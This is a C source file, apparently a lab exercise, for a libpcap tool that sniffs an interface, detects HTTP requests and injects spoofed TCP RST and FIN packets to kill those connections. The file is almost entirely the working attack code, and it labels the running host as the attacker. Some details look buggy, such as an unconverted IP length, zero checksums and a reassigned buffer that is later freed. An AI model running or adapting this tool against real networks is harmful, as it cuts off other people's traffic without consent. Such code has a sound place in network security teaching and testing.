#define ETHERTYPE_IP 0x0800

#include <pcap.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <stdlib.h>

#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <net/if.h>
#include <sys/ioctl.h>

#define TCP_FORWARD 1
#define TCP_BACKWARD 2
#define LIBNET_LIL_ENDIAN 1

#pragma pack(push, 1)

/*
 *  IPv4 header
 *  Internet Protocol, version 4
 *  Static header size: 20 bytes
 */
struct libnet_ipv4_hdr
{
#if (LIBNET_LIL_ENDIAN)
	uint8_t ip_hl : 4, /* header length */
		ip_v : 4;	  /* version */
#endif
#if (LIBNET_BIG_ENDIAN)
	uint8_t ip_v : 4, /* version */
		ip_hl : 4;	/* header length */
#endif
	uint8_t ip_tos; /* type of service */
#ifndef IPTOS_LOWDELAY
#define IPTOS_LOWDELAY 0x10
#endif
#ifndef IPTOS_THROUGHPUT
#define IPTOS_THROUGHPUT 0x08
#endif
#ifndef IPTOS_RELIABILITY
#define IPTOS_RELIABILITY 0x04
#endif
#ifndef IPTOS_LOWCOST
#define IPTOS_LOWCOST 0x02
#endif
	uint16_t ip_len; /* total length */
	uint16_t ip_id;  /* identification */
	uint16_t ip_off;
#ifndef IP_RF
#define IP_RF 0x8000 /* reserved fragment flag */
#endif
#ifndef IP_DF
#define IP_DF 0x4000 /* dont fragment flag */
#endif
#ifndef IP_MF
#define IP_MF 0x2000 /* more fragments flag */
#endif
#ifndef IP_OFFMASK
#define IP_OFFMASK 0x1fff /* mask for fragmenting bits */
#endif
	uint8_t ip_ttl;				   /* time to live */
	uint8_t ip_p;				   /* protocol */
	uint16_t ip_sum;			   /* checksum */
	struct in_addr ip_src, ip_dst; /* source and dest address */
};

/*
 *  TCP header
 *  Transmission Control Protocol
 *  Static header size: 20 bytes
 */
struct libnet_tcp_hdr
{
	uint16_t th_sport; /* source port */
	uint16_t th_dport; /* destination port */
	uint32_t th_seq;   /* sequence number */
	uint32_t th_ack;   /* acknowledgement number */
#if (LIBNET_LIL_ENDIAN)
	uint8_t th_x2 : 4, /* (unused) */
		th_off : 4;	/* data offset */
#endif
#if (LIBNET_BIG_ENDIAN)
	uint8_t th_off : 4, /* data offset */
		th_x2 : 4;		/* (unused) */
#endif
	uint8_t th_flags; /* control flags */
#ifndef TH_FIN
#define TH_FIN 0x01 /* finished send data */
#endif
#ifndef TH_SYN
#define TH_SYN 0x02 /* synchronize sequence numbers */
#endif
#ifndef TH_RST
#define TH_RST 0x04 /* reset the connection */
#endif
#ifndef TH_PUSH
#define TH_PUSH 0x08 /* push data to the app layer */
#endif
#ifndef TH_ACK
#define TH_ACK 0x10 /* acknowledge */
#endif
#ifndef TH_URG
#define TH_URG 0x20 /* urgent! */
#endif
#ifndef TH_ECE
#define TH_ECE 0x40
#endif
#ifndef TH_CWR
#define TH_CWR 0x80
#endif
	uint16_t th_win; /* window */
	uint16_t th_sum; /* checksum */
	uint16_t th_urp; /* urgent pointer */
};

struct eth_header
{
	uint8_t dst_mac[6];
	uint8_t src_mac[6];
	uint16_t type;
};

void print_mac(uint8_t *p)
{
	for (int j = 0; j < 6; j++)
	{
		printf("%02X", p[j]);
		if (j != 5)
			printf(":");
	}
	printf("\n");
}

void usage()
{
	printf("syntax: tmp <interface>\n");
	printf("sample: tmp wlan0\n");
}

int send_tcp_flags(pcap_t *handle, int forward, uint8_t flags, int Datalen, struct eth_header *eth, struct libnet_ipv4_hdr *ip, struct libnet_tcp_hdr *tcp, uint8_t *my_mac);

struct eth_header *eth_new;
struct libnet_ipv4_hdr *ip_new;
struct libnet_tcp_hdr *tcp_new;
uint8_t *tcp_flags;

int main(int argc, char *argv[])
{
	eth_new = (struct eth_header *)malloc(sizeof(struct eth_header) + 1);
	ip_new = (struct libnet_ipv4_hdr *)malloc(sizeof(struct libnet_ipv4_hdr) + 1);
	tcp_new = (struct libnet_tcp_hdr *)malloc(sizeof(struct libnet_tcp_hdr) + 1);
	tcp_flags = (uint8_t *)malloc(sizeof(struct eth_header) + sizeof(struct libnet_ipv4_hdr) + sizeof(struct libnet_tcp_hdr) + 1);

	struct eth_header *eth = (struct eth_header *)malloc(sizeof(struct eth_header) + 1);
	struct libnet_ipv4_hdr *ip = (struct libnet_ipv4_hdr *)malloc(sizeof(struct libnet_ipv4_hdr) + 1);
	struct libnet_tcp_hdr *tcp = (struct libnet_tcp_hdr *)malloc(sizeof(struct libnet_tcp_hdr) + 1);
	
	if (argc != 2)
	{
		usage();
		return -1;
	}

	struct ifreq ifr;
	int sockfd;

	char *name = argv[1];
	if (strlen(name) >= IFNAMSIZ)
		printf("device name is error.\n"), exit(0);

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);

	strcpy(ifr.ifr_name, name);
	//get HWaddr
	uint8_t my_mac[6];
	if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == -1)
		printf("hwaddr error.\n"), exit(0);

	memcpy(my_mac, ifr.ifr_hwaddr.sa_data, sizeof(my_mac));
	printf("Attacker HWaddr: %02X:%02X:%02X:%02X:%02X:%02X\n", my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);

	// pcap open
	char *dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == NULL)
	{
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	const char http_method[6][10] = {"GET ", "POST ", "HEAD ", "PUT ", "DELETE ", "OPTIONS "};
	const int http_methodlen[6] = {4, 5, 5, 4, 7, 8};

	while (true)
	{
		struct pcap_pkthdr *header;
		const uint8_t *packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0)
			continue;
		if (res == -1 || res == -2)
			break;
		//printf("%u bytes captured\n", header->caplen);
		if (header->caplen < 40)
			continue;

		const uint8_t *p = packet;
		eth = (struct eth_header *)p;
		if (ntohs(eth->type) == ETHERTYPE_IP) // if IPv4
		{
			p += sizeof(struct eth_header);
			ip = (struct libnet_ipv4_hdr *)p;

			int IPlen = ip->ip_hl * 4;
			int Totallen = ntohs(ip->ip_len);
			if (ip->ip_p == IPPROTO_TCP) //if TCP
			{
				printf("TCP %u bytes captured\n", header->caplen);fflush(stdout);
				p += IPlen;
				tcp = (struct libnet_tcp_hdr *)p;
				int TCPlen = tcp->th_off * 4;
				int Datalen = Totallen - IPlen - TCPlen;
				int ok = 0;
				if (Datalen > 0)
				{
					p += TCPlen;
					for (int j = 0; j < 6; j++)
					{
						if (memcmp(p, http_method[j], http_methodlen[j]) == 0)
						{
							printf("(HTTP %s method found)\n", http_method[j]);
							ok = 1;
						}
					}
				}
				if (ok == 1) //if HTTP
				{
					//send tcp rst(forward)
					send_tcp_flags(handle, TCP_FORWARD, TH_RST + TH_ACK, Datalen, eth, ip, tcp, my_mac);
					//send tcp fin(backward)
					send_tcp_flags(handle, TCP_BACKWARD, TH_FIN + TH_ACK, Datalen, eth, ip, tcp, my_mac);
				}
				else //if just TCP
				{
					//send tcp rst(forward)
					//send_tcp_flags(handle, TCP_FORWARD, TH_RST + TH_ACK, Datalen, eth, ip, tcp, my_mac);
					//send tcp rst(backward)
					//send_tcp_flags(handle, TCP_BACKWARD, TH_RST + TH_ACK, Datalen, eth, ip, tcp, my_mac);
				}
			}
		}
	}

	free(eth);
	free(ip);
	free(tcp);

	free(eth_new);
	free(ip_new);
	free(tcp_new);
	free(tcp_flags);
	pcap_close(handle);
	return 0;
}

int send_tcp_flags(pcap_t *handle, int forward, uint8_t flags, int Datalen, struct eth_header *eth, struct libnet_ipv4_hdr *ip, struct libnet_tcp_hdr *tcp, uint8_t *my_mac)
{
	eth_new->type = htons(ETHERTYPE_IP);
	memcpy(eth_new->src_mac, my_mac, 6);

	ip_new->ip_hl = 5;   //header length
	ip_new->ip_v = 4;	//ip version
	ip_new->ip_tos = 0;  //type of services
	ip_new->ip_len = 40; //total length
	ip_new->ip_id = htons(0x30d5); //identification
	ip_new->ip_off = 0; //fragment offset
	ip_new->ip_ttl = 255; //time to live
	ip_new->ip_p = IPPROTO_TCP; //protocol
	ip_new->ip_sum = 0; //checksum
	if (forward == TCP_FORWARD)
	{
		memcpy(eth_new->dst_mac, eth->dst_mac, 6);
		ip_new->ip_src = ip->ip_src;
		ip_new->ip_dst = ip->ip_dst;
		tcp_new->th_sport = tcp->th_sport; //src port
		tcp_new->th_dport = tcp->th_dport; //dst port
		tcp_new->th_seq = tcp->th_seq + htonl(Datalen); //seq num
		tcp_new->th_ack = tcp->th_ack; //ack num
	}
	else if (forward == TCP_BACKWARD)
	{
		memcpy(eth_new->dst_mac, eth->src_mac, 6);
		ip_new->ip_src = ip->ip_dst;
		ip_new->ip_dst = ip->ip_src;
		tcp_new->th_sport = tcp->th_dport; //src port
		tcp_new->th_dport = tcp->th_sport; //dst port
		tcp_new->th_seq = tcp->th_ack; //seq num
		tcp_new->th_ack = tcp->th_seq + htonl(Datalen); //ack num
	}
	tcp_new->th_off = 5;		//data offset(header length)
	tcp_new->th_flags = flags; //control flags
	tcp_new->th_win = 0; //window
	tcp_new->th_sum = 0; //checksum
	tcp_new->th_urp = 0; //urgent pointer
	tcp_flags = (uint8_t *)eth_new;
	memcpy(tcp_flags + sizeof(struct eth_header), ip_new, sizeof(struct libnet_ipv4_hdr));
	memcpy(tcp_flags + sizeof(struct eth_header) + sizeof(struct libnet_ipv4_hdr), tcp_new, sizeof(struct libnet_tcp_hdr));

	if (pcap_inject(handle, tcp_flags, sizeof(struct eth_header) + sizeof(struct libnet_ipv4_hdr) + sizeof(struct libnet_tcp_hdr)) == -1)
	{
		fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
		return -1;
	}
	printf("TCP RST/FIN sent\n"); fflush(stdout);
	return 0;
}